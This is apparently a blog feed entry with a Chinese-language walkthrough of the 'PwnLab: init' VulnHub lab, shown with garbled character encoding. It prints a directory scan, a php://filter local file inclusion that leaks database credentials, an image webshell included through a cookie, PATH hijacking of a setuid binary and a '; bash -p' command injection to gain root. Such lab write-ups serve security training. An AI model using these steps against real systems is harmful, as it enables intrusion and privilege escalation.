class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.1.11/_25-08-19_16-31-41.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">1.11</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">41</span>] <span class="params">Starting:</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">51</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">298</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">52</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">301</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">52</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">303</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">52</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">301</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">52</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">301</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">52</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">299</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">52</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">301</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">52</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">302</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">52</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">300</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">52</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">299</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">52</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">299</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">52</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">292</span>B  <span class="operator">-</span> <span class="symbol">/.html</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">52</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">291</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">52</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">301</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">52</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">297</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">52</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">298</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">58</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">291</span>B  <span class="operator">-</span> <span class="symbol">/.php</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">31</span>:<span class="number">58</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">292</span>B  <span class="operator">-</span> <span class="symbol">/.php3</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">33</span>:<span class="number">07</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/config.php</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">33</span>:<span class="number">38</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">455</span>B  <span class="operator">-</span> <span class="operator">/</span>images<span class="symbol">/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">33</span>:<span class="number">38</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">313</span>B  <span class="operator">-</span> <span class="symbol">/images</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">1.11</span><span class="operator">/</span>images<span class="symbol">/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">33</span>:<span class="number">51</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">164</span>B  <span class="operator">-</span> <span class="symbol">/login.php</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">34</span>:<span class="number">34</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">300</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">34</span>:<span class="number">34</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">301</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">34</span>:<span class="number">58</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">313</span>B  <span class="operator">-</span> <span class="symbol">/upload</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">1.11</span><span class="operator">/</span>upload<span class="symbol">/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">34</span>:<span class="number">58</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">19</span>B  <span class="operator">-</span> <span class="symbol">/upload.php</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">34</span>:<span class="number">58</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">404</span>B  <span class="operator">-</span> <span class="operator">/</span>upload<span class="operator">/</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªé…ç½®æ–‡ä»¶config.php ä½†æ˜¯æ— æ³•ç›´æ¥è®¿é—®ï¼Œupload.phpå°±æ˜¯é¦–é¡µä¸­çš„ï¼Œè¦å…ˆç™»å½•<br>ç°åœ¨å°±çœ‹èƒ½ä¸èƒ½è¯»åˆ°config.php<br>æ³¨æ„åˆ°ç™»å½•ç•Œé¢çš„url<code>http://192.168.1.11/?page=login</code> è¿™ä¸ªå‚æ•°å¾ˆå¯èƒ½å­˜åœ¨lfi<br>ç›´æ¥ç”¨fileåè®®æ²¡æœ‰ç»“æœ  ç„¶åç”¨phpä¼ªåè®®ç”¨base64åŠ å¯†è¯»å–ï¼Œç›´æ¥ç”¨<code>http://192.168.1.11/?page=php://filter/read=convert.base64-encode/resource=config.php</code>ä¹Ÿè¯»ä¸åˆ°ï¼Œç»“åˆä¸€å¼€å§‹æ˜¯pageæ˜¯login ç›®å½•æ‰«æåˆ°çš„æ˜¯login.php<br>æ‰€ä»¥å¯èƒ½æ˜¯è‡ªåŠ¨æ·»åŠ äº†åç¼€ã€‚ æ‰€ä»¥ç›´æ¥è¯»config<br><img src="https://pic1.imgdb.cn/item/68a439c458cb8da5c8384ff9.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># echo &quot;PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+&quot; | base64 -d</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$server</span>   = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;H4u%QJ_H99&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;Users&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>     </span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°äº†æ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç ä»¥åŠæ•°æ®åº“<br>è¿›å…¥æ•°æ®åº“å¾—åˆ°è´¦å·å¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">MySQL [Users]&gt; select * from users;</span><br><span class="line"><span class="code">+------+</span>------------------+</span><br><span class="line"><span class="section">| user | pass             |</span></span><br><span class="line"><span class="section">+------+------------------+</span></span><br><span class="line">| kent | Sld6WHVCSkpOeQ== |</span><br><span class="line">| mike | U0lmZHNURW42SQ== |</span><br><span class="line"><span class="section">| kane | aVN2NVltMkdSbw== |</span></span><br><span class="line"><span class="section">+------+------------------+</span></span><br><span class="line">3 rows in set (0.012 sec)</span><br><span class="line"></span><br><span class="line">MySQL [Users]&gt;</span><br></pre></td></tr></table></figure></div>
<p>å®é™…çš„å¯†ç éœ€è¦ç”¨base64è§£ç åçš„æ˜æ–‡ç™»å½•</p>
<p>éšä¾¿ç™»å½•ä¸€ä¸ªç”¨æˆ·ï¼Œå‡†å¤‡ä¸Šä¼ ä¸€ä¸ªwebshell<br>ç”¨lfiæ¼æ´æŸ¥çœ‹upload.phpçš„æºç  å‘ç°æœ‰åç¼€ç™½åå•æ£€æŸ¥ MIMEæ£€æŸ¥ getimagesize æ£€æŸ¥<br>ç°åœ¨ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬<br><img src="https://pic1.imgdb.cn/item/68a52c5f58cb8da5c83b3000.png"><br>ç„¶ååœ¨uploadä¸­å¯ä»¥çœ‹åˆ°æ–‡ä»¶ä¸Šä¼ ä¹‹åçš„è·¯å¾„<br><img src="https://pic1.imgdb.cn/item/68a52c8558cb8da5c83b325e.png"><br><code>upload/274a01ad7ad7ad7d73d5f0b399ae5db2.gif</code><br>ç°åœ¨å°±æ˜¯è§£å†³å¦‚ä½•æŠŠè¿™ä¸ªgifæ–‡ä»¶è§£ææˆphp<br>ç»§ç»­ç”¨phpä¼ªåè®®è¯»å–é¦–é¡µä»£ç ï¼Œå‘ç°æœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªè§£æåˆšåˆšä¸Šä¼ çš„gifæ–‡ä»¶æˆphp<br><img src="https://pic1.imgdb.cn/item/68a52d3658cb8da5c83b3d49.png"><br>è¿™é‡Œæ˜¯ç”¨COOKIEä¸­çš„langè¿™ä¸ªå‚æ•°ä¼ å…¥è¦è§£æçš„æ–‡ä»¶ï¼Œä½†æ˜¯è¦æ³¨æ„å‰é¢æ‹¼æ¥äº†lang<br>æ‰€ä»¥åœ¨cookieä¸­æ·»åŠ  <code>lang=../upload/[æ–‡ä»¶å]</code><br>è®¿é—®é¦–é¡µå°±çœ‹åˆ°è¢«æˆåŠŸåŒ…å«äº†<br><img src="https://pic1.imgdb.cn/item/68a52fd358cb8da5c83b4046.png"><br>antswordè¿æ¥ä¹‹åæ‰“å¼€è™šæ‹Ÿç»ˆç«¯ åå¼¹shell<br><img src="https://pic1.imgdb.cn/item/68a5346458cb8da5c83b8e96.png"></p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>æ‹¿åˆ°wwwæƒé™ä¹‹å åœ¨homeç›®å½•ä¸‹å‘ç°å‡ ä¸ªç”¨æˆ·ï¼Œç»§ç»­ç”¨åˆšæ‰åœ¨ç½‘é¡µä¸Šç™»å½•çš„ç”¨æˆ·è´¦å·å¯†ç åˆ‡æ¢kentç”¨æˆ·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@pwnlab</span><span class="symbol">:/var</span><span class="variable">$ </span>cd /home</span><br><span class="line">cd /home</span><br><span class="line">www-data<span class="variable">@pwnlab</span><span class="symbol">:/home</span><span class="variable">$ </span>ls</span><br><span class="line">ls</span><br><span class="line">john  kane  kent  mike</span><br><span class="line">www-data<span class="variable">@pwnlab</span><span class="symbol">:/home</span><span class="variable">$ </span>su - kent</span><br><span class="line">su - kent</span><br><span class="line"><span class="symbol">Password:</span> <span class="title class_">JWzXuBJJNy</span></span><br><span class="line"></span><br><span class="line">kent<span class="variable">@pwnlab</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">ls</span><br><span class="line">kent<span class="variable">@pwnlab</span><span class="symbol">:~</span><span class="variable">$ </span>cd</span><br><span class="line">cd</span><br><span class="line">kent<span class="variable">@pwnlab</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">ls</span><br><span class="line">kent<span class="variable">@pwnlab</span><span class="symbol">:~</span><span class="variable">$ </span>cd /home</span><br><span class="line">cd /home</span><br><span class="line">kent<span class="variable">@pwnlab</span><span class="symbol">:/home</span><span class="variable">$ </span>ls</span><br><span class="line">ls</span><br><span class="line">john  kane  kent  mike</span><br><span class="line">kent<span class="variable">@pwnlab</span><span class="symbol">:/home</span><span class="variable">$ </span>cd kent</span><br><span class="line">cd kent</span><br><span class="line">kent<span class="variable">@pwnlab</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">ls</span><br><span class="line">kent<span class="variable">@pwnlab</span><span class="symbol">:~</span><span class="variable">$ </span>ls -al</span><br><span class="line">ls -al</span><br><span class="line">total <span class="number">20</span></span><br><span class="line">drwxr-x--- <span class="number">2</span> kent kent <span class="number">4096</span> <span class="title class_">Mar</span> <span class="number">17</span>  <span class="number">2016</span> .</span><br><span class="line">drwxr-xr-x <span class="number">6</span> root root <span class="number">4096</span> <span class="title class_">Mar</span> <span class="number">17</span>  <span class="number">2016</span> ..</span><br><span class="line">-rw-r--r-- <span class="number">1</span> kent kent  <span class="number">220</span> <span class="title class_">Mar</span> <span class="number">17</span>  <span class="number">2016</span> .bash_logout</span><br><span class="line">-rw-r--r-- <span class="number">1</span> kent kent <span class="number">3515</span> <span class="title class_">Mar</span> <span class="number">17</span>  <span class="number">2016</span> .bashrc</span><br><span class="line">-rw-r--r-- <span class="number">1</span> kent kent  <span class="number">675</span> <span class="title class_">Mar</span> <span class="number">17</span>  <span class="number">2016</span> .profile</span><br><span class="line">kent<span class="variable">@pwnlab</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">-<span class="symbol">su:</span> <span class="symbol">sudo:</span> command <span class="keyword">not</span> found</span><br><span class="line">kent<span class="variable">@pwnlab</span><span class="symbol">:~</span>$</span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰  ä¹Ÿæ²¡æœ‰sudo<br>å†å°è¯•å¦å¤–ä¸¤ä¸ªç”¨æˆ· å‘ç°kaneå¯ä»¥ç™»å½• å¹¶ä¸”ç›®å½•ä¸‹é¢æœ‰ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">kane@pwnlab:~$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 28</span><br><span class="line">drwxr-x---<span class="number"> 2 </span>kane kane<span class="number"> 4096 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>.</span><br><span class="line">drwxr-xr-x<span class="number"> 6 </span>root root<span class="number"> 4096 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>..</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>kane kane <span class="number"> 220 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>.bash_logout</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>kane kane<span class="number"> 3515 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>.bashrc</span><br><span class="line">-rwsr-sr-x<span class="number"> 1 </span>mike mike<span class="number"> 5148 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>msgmike</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>kane kane <span class="number"> 675 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>.profile</span><br><span class="line">kane@pwnlab:~$ file msgmike</span><br><span class="line">file msgmike</span><br><span class="line">msgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version<span class="number"> 1 </span>(SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7e0b21f33b2134bd17467c3bb9be37deb88b365, not stripped</span><br></pre></td></tr></table></figure></div>

<p>æ‰§è¡Œä¹‹åå‘ç°ä¼šæ‰§è¡Œä¸€ä¸ªcatå‘½ä»¤ </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">kane@pwnlab:~$ ./msgmike</span><br><span class="line">./msgmike</span><br><span class="line"><span class="built_in">cat</span>: /home/mike/msg.txt: No such file or directory</span><br></pre></td></tr></table></figure></div>
<p>æ—¢ç„¶è¿™ä¸ªæ–‡ä»¶å±äºmike é‚£å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç¨‹åºæ¥ææƒåˆ°mike  æ–¹å¼å°±æ˜¯åŠ«æŒç¯å¢ƒå˜é‡ è®©catè°ƒç”¨æˆ‘ä»¬è‡ªåˆ›çš„cat</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">kane@pwnlab:~$ echo &quot;/bin/bash&quot; &gt; cat</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; cat</span><br><span class="line">kane@pwnlab:~$ chmod<span class="number"> 777 </span>cat</span><br><span class="line">chmod<span class="number"> 777 </span>cat</span><br><span class="line">kane@pwnlab:~$ ls</span><br><span class="line">ls</span><br><span class="line">cat  msgmike</span><br><span class="line">kane@pwnlab:~$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-x---<span class="number"> 2 </span>kane kane<span class="number"> 4096 </span>Aug<span class="number"> 19 </span>22:45 .</span><br><span class="line">drwxr-xr-x<span class="number"> 6 </span>root root<span class="number"> 4096 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>..</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>kane kane <span class="number"> 220 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>.bash_logout</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>kane kane<span class="number"> 3515 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>.bashrc</span><br><span class="line">-rwxrwxrwx<span class="number"> 1 </span>kane kane  <span class="number"> 10 </span>Aug<span class="number"> 19 </span>22:45 cat</span><br><span class="line">-rwsr-sr-x<span class="number"> 1 </span>mike mike<span class="number"> 5148 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>msgmike</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>kane kane <span class="number"> 675 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>.profile</span><br><span class="line">kane@pwnlab:~$ export PATH=./:$PATH</span><br><span class="line">export PATH=./:$PATH</span><br><span class="line">kane@pwnlab:~$ ./msgmike</span><br><span class="line">./msgmike</span><br><span class="line">mike@pwnlab:~$ id</span><br><span class="line">id</span><br><span class="line">uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)</span><br></pre></td></tr></table></figure></div>
<p>åœ¨mikeç›®å½•ä¸‹åˆå‘ç°ä¸€ä¸ªå±äºrootçš„å¯æ‰§è¡Œæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">mike@pwnlab:/home/mike$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 28</span><br><span class="line">drwxr-x---<span class="number"> 2 </span>mike mike<span class="number"> 4096 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>.</span><br><span class="line">drwxr-xr-x<span class="number"> 6 </span>root root<span class="number"> 4096 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>..</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>mike mike <span class="number"> 220 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>.bash_logout</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>mike mike<span class="number"> 3515 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>.bashrc</span><br><span class="line">-rwsr-sr-x<span class="number"> 1 </span>root root<span class="number"> 5364 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>msg2root</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>mike mike <span class="number"> 675 </span>Mar<span class="number"> 17 </span><span class="number"> 2016 </span>.profile</span><br><span class="line">mike@pwnlab:/home/mike$ file msg2root</span><br><span class="line">file msg2root</span><br><span class="line">msg2root: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version<span class="number"> 1 </span>(SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=60bf769f8fbbfd406c047f698b55d2668fae14d3, not stripped</span><br></pre></td></tr></table></figure></div>
<p>ç”¨stringæŸ¥çœ‹<br>å‘ç°æ‰§è¡Œäº†<code>/bin/echo %s &gt;&gt; /root/messages.txt</code>å‘½ä»¤</p>
<p>é‚£å°±å¯ä»¥åœ¨å‘é€æ¶ˆæ¯åé¢ç”¨; æˆªæ–­åé¢æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ è¿™é‡Œå¯ä»¥ç”¨bash -pç‰¹æƒæ¨¡å¼ è®©å½“å‰shellæœ‰rootçš„æƒé™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">mike<span class="meta">@pwnlab:/home/mike$</span> ./msg2root</span><br><span class="line">./msg2root</span><br><span class="line">Message for root: 1;ls</span><br><span class="line">1;ls</span><br><span class="line">1</span><br><span class="line">msg2root</span><br><span class="line">mike<span class="meta">@pwnlab:/home/mike$</span> ./msg2root</span><br><span class="line">./msg2root</span><br><span class="line">Message for root: 11; bash -p</span><br><span class="line">11; bash -p</span><br><span class="line">11</span><br><span class="line">bash-4.3<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)</span><br><span class="line">bash-4.3<span class="comment"># su - root</span></span><br><span class="line">su - root</span><br><span class="line">Password:</span><br><span class="line"></span><br><span class="line">su: Authentication failure</span><br><span class="line">bash-4.3<span class="comment"># cd /root</span></span><br><span class="line">cd /root</span><br><span class="line">bash-4.3<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">flag.txt  messages.txt</span><br><span class="line">bash-4.3<span class="comment"># cat flag.txt</span></span><br><span class="line">cat flag.txt</span><br><span class="line">.-=~=-.                                                                 .-=~=-.</span><br><span class="line">(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)</span><br><span class="line">(_ ___)  _____                             _                            (_ ___)</span><br><span class="line">(__  _) /  __ \                           |<span class="string"> </span>|<span class="string">                           (__  _)</span></span><br><span class="line"><span class="string">( _ __) </span>|<span class="string"> /  \/ ___  _ __   __ _ _ __ __ _</span>|<span class="string"> </span>|<span class="string">_ ___                      ( _ __)</span></span><br><span class="line"><span class="string">(__  _) </span>|<span class="string"> </span>|<span class="string">    / _ \</span>|<span class="string"> &#x27;_ \ / _` </span>|<span class="string"> &#x27;__/ _` </span>|<span class="string"> __/ __</span>|<span class="string">                     (__  _)</span></span><br><span class="line"><span class="string">(_ ___) </span>|<span class="string"> \__/\ (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_\__ \                     (_ ___)</span></span><br><span class="line"><span class="string">(__  _)  \____/\___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\__, </span>|<span class="string">_</span>|<span class="string">  \__,_</span>|<span class="string">\__</span>|<span class="string">___/                     (__  _)</span></span><br><span class="line"><span class="string">( _ __)                     __/ </span>|<span class="string">                                       ( _ __)</span></span><br><span class="line"><span class="string">(__  _)                    </span>|<span class="string">___/                                        (__  _)</span></span><br><span class="line"><span class="string">(__  _)                                                                 (__  _)</span></span><br><span class="line"><span class="string">(_ ___) If  you are  reading this,  means  that you have  break &#x27;init&#x27;  (_ ___)</span></span><br><span class="line"><span class="string">( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)</span></span><br><span class="line"><span class="string">(__  _) this challenge.                                                 (__  _)</span></span><br><span class="line"><span class="string">(_ ___)                                                                 (_ ___)</span></span><br><span class="line"><span class="string">( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)</span></span><br><span class="line"><span class="string">(__  _) reading it                                                      (__  _)</span></span><br><span class="line"><span class="string">(__  _)                                                                 (__  _)</span></span><br><span class="line"><span class="string">(__  _)                                             For sniferl4bs.com  (__  _)</span></span><br><span class="line"><span class="string">( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)</span></span><br><span class="line"><span class="string">(__  _)                                                                 (__  _)</span></span><br><span class="line"><span class="string">(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)</span></span><br><span class="line"><span class="string">`-._.-&#x27;                                                                 `-._.-&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>å®Œæˆ</p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><ul>
<li>å‘ç°configæ–‡ä»¶ å°è¯•ç”¨phpä¼ªåè®®è¯»å–æ–‡ä»¶å†…å®¹</li>
<li>æ•°æ®åº“å¯†ç çš„å¤ç”¨ å¯ä»¥ç™»å½•ç”¨æˆ·</li>
<li>å›¾ç‰‡é©¬ æ‰¾æ–‡ä»¶åŒ…å«  é¦–é¡µæºç æœ‰langçš„cookieå€¼ä¼ å‚åŒ…å«</li>
<li>ææƒè€ƒå¯Ÿéƒ½æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„åŠ«æŒ ä¸€ä¸ªæ˜¯ç¯å¢ƒå˜é‡åŠ«æŒ  ä¸€ä¸ªæ˜¯å‘½ä»¤æ³¨å…¥</li>
<li>å­¦ä¹ ä»¥ååœ¨æœ‰æ–‡ä»¶è¯»å–çš„æ—¶å€™ä¸è¦æ”¾è¿‡é¦–é¡µç­‰ï¼Œå¯èƒ½åŒ…å«å…¶ä»–ä¿¡æ¯ã€‚</li>
</ul>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Vulny</title>
    <url>/posts/19932.html</url>
    <content><![CDATA[<p>HMV-Vulnyé¶åœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679ddc0dd0e0a243d4f97365.png"><br>è¿™ä¸ªé¶æœºæ˜¯ä¸€ä¸ªubuntuç³»ç»Ÿçš„é¶æœºï¼Œå‰é¢è·å–ä¸åˆ°é¶æœºipï¼Œä¿®æ”¹äº†å¥½é•¿æ—¶é—´ï¼Œä¸è¿‡ä¹Ÿæ­£å¥½è¡¥å……æˆ‘çš„é¶æœºé…ç½®åšå®¢<br>è§£å†³æ–¹æ¡ˆåœ¨ï¼š <a href="/posts/86.html" title="macç¯å¢ƒé¶åœºæ­å»º">macç¯å¢ƒé¶åœºæ­å»º</a></p>
